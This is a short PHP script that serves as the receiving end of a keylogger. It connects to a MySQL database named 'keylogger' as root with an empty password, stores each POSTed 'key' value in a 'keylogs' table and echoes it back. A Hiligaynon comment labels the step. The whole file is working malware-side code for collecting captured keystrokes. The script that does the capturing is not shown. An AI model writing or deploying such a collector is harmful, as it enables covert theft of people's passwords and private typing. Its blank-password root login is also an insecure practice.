<?php
$host = "localhost";
$user = "root"; 
$pass = "";     
$dbname = "keylogger"; 

$conn = new mysqli($host, $user, $pass, $dbname);

if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error); 
}
 
// Kung may ginpadala nga 'key'
if (isset($_POST['key'])) {
    $key = $conn->real_escape_string($_POST['key']);
    $sql = "INSERT INTO keylogs (key_pressed) VALUES ('$key')";

    if ($conn->query($sql) === TRUE) {
        echo "Key pressed: " . htmlspecialchars($key);
    } else {
        echo "Error: " . $conn->error;
    }
}

$conn->close();
?>
